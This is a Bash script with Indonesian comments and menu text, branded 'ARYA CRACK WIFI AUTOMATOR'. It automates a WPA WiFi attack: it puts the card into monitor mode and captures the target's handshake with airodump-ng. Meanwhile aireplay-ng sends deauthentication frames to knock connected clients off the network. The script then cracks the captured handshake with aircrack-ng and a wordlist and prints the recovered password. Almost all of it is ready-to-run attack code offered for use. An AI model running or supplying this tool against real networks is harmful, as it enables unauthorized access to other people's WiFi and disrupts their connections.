#!/bin/bash

# =================================================================
# Skrip WPA Cracker Otomatis V11 (ARYA CRACK EDITION)
# Update: Auto-Close Terminal Scan & Cleanup Jendela Otomatis
# =================================================================

CYAN='\033[96m'
GREEN='\033[92m'
YELLOW='\033[93m'
RED='\033[91m'
NC='\033[0m'
BOLD='\033[1m'

# --- KONFIGURASI PATH ---
WIFI_INTERFACE="wlan0"
MON_INTERFACE="wlan0mon"
CAPTURE_DIR="/home/kali/hck/wifi"
WORDLIST_PATH="$CAPTURE_DIR/aryacrack.txt" 
HANDSHAKE_BASE="WPA_Capture"
RESULT_FILE="$CAPTURE_DIR/hasil_crack.txt"

BSSID_TARGET=""
TARGET_CH=""
ATTACK_DURATION=25 

function check_prereqs() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!] Error: Jalankan dengan sudo!${NC}" 
        exit 1
    fi
}

function delete_captures() {
    echo -e "${YELLOW}[*] Membersihkan file capture...${NC}"
    rm -f $CAPTURE_DIR/${HANDSHAKE_BASE}* 2> /dev/null
    rm -f "$RESULT_FILE" 2> /dev/null
}

function cleanup() {
    echo -e "\n${YELLOW}[*] Menghentikan proses dan mereset WiFi...${NC}"
    # Menutup semua terminal tambahan yang mungkin masih terbuka
    sudo killall airodump-ng 2> /dev/null
    sudo killall aireplay-ng 2> /dev/null
    sudo killall tilix 2> /dev/null
    sudo killall terminator 2> /dev/null
    
    if [ -n "$MON_INTERFACE" ] && ip link show "$MON_INTERFACE" &> /dev/null; then
        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
    fi

    sudo ip link set "$WIFI_INTERFACE" down > /dev/null 2>&1
    sudo iwconfig "$WIFI_INTERFACE" mode managed > /dev/null 2>&1
    sudo ip link set "$WIFI_INTERFACE" up > /dev/null 2>&1
    sudo systemctl restart NetworkManager > /dev/null 2>&1
}

function start_crack() {
    echo -e "\n${CYAN}=== STEP 1: SCAN TARGET ===${NC}"
    nohup tilix -t "SCAN" -e "nmcli device wifi list" &> /dev/null &
    
    read -p "Masukkan BSSID Target: " BSSID_TARGET
    read -p "Masukkan Channel: " TARGET_CH
    
    # --- PERBAIKAN: Close Tilix setelah input AP selesai ---
    sudo killall tilix 2> /dev/null
    
    if [ -z "$BSSID_TARGET" ] || [ -z "$TARGET_CH" ]; then return; fi

    # Set Monitor Mode
    airmon-ng check kill > /dev/null 2>&1
    airmon-ng start "$WIFI_INTERFACE" > /dev/null 2>&1
    MON_INTERFACE="${WIFI_INTERFACE}mon"
    iwconfig "$MON_INTERFACE" channel "$TARGET_CH" > /dev/null 2>&1
    
    echo -e "\n${CYAN}=== STEP 2: CAPTURING HANDSHAKE ===${NC}"
    nohup terminator --title="SNIFFER" -e "sudo airodump-ng --bssid $BSSID_TARGET --channel $TARGET_CH --write $CAPTURE_DIR/$HANDSHAKE_BASE $MON_INTERFACE" &> /dev/null &
    sleep 5
    
    nohup terminator --title="DEAUTH" -e "sudo aireplay-ng -0 10 -a $BSSID_TARGET $MON_INTERFACE; sleep 2" &> /dev/null &
    
    echo -e "${YELLOW}[*] Menunggu Handshake... (10-30 detik)${NC}"
    sleep "$ATTACK_DURATION"
    
    # Tutup sniffer dan deauth setelah waktu tunggu selesai
    sudo killall airodump-ng 2> /dev/null
    sudo killall terminator 2> /dev/null
    
    CAPTURED_FILE=$(ls -t $CAPTURE_DIR/${HANDSHAKE_BASE}*.cap 2> /dev/null | head -n 1)
    
    if [ -z "$CAPTURED_FILE" ]; then
        echo -e "${RED}[!] Handshake gagal ditangkap.${NC}"
    else
        echo -e "\n${CYAN}=== STEP 3: CRACKING PASSWORD ===${NC}"
        # Aircrack berjalan di terminal utama agar Arya bisa lihat prosesnya
        sudo aircrack-ng -a 2 -b "$BSSID_TARGET" -w "$WORDLIST_PATH" "$CAPTURED_FILE" -l "$RESULT_FILE"
        
        echo -e "\n${CYAN}==========================================${NC}"
        if [ -f "$RESULT_FILE" ]; then
            PASS=$(cat "$RESULT_FILE")
            echo -e "${GREEN}${BOLD}SUCCESS! PASSWORD CRACK : $PASS${NC}"
        else
            echo -e "${RED}${BOLD}PASSWORD KUAT GAGAL MENEMUKAN PASSWORD${NC}"
        fi
        echo -e "${CYAN}==========================================${NC}"
    fi
    
    read -p "Tekan ENTER untuk kembali ke menu..." 
    cleanup
    delete_captures
}

# --- MENU UTAMA ---
check_prereqs
trap "cleanup; delete_captures; exit" SIGINT SIGTERM

while true; do
    clear
    echo -e "${CYAN}==========================================${NC}"
    echo -e "${GREEN}      ARYA CRACK WIFI AUTOMATOR           ${NC}"
    echo -e "${CYAN}==========================================${NC}"
    echo -e "${YELLOW}1)${NC} Crack Password WiFi"
    echo -e "${YELLOW}2)${NC} Hapus Sampah Capture"
    echo -e "${YELLOW}3)${NC} Keluar"
    echo -e "${CYAN}==========================================${NC}"
    read -p "Pilih [1-3]: " MENU
    
    case $MENU in
        1) start_crack ;;
        2) delete_captures; read -p "Tekan ENTER..." ;;
        3) cleanup; delete_captures; exit 0 ;;
        *) sleep 1 ;;
    esac
done
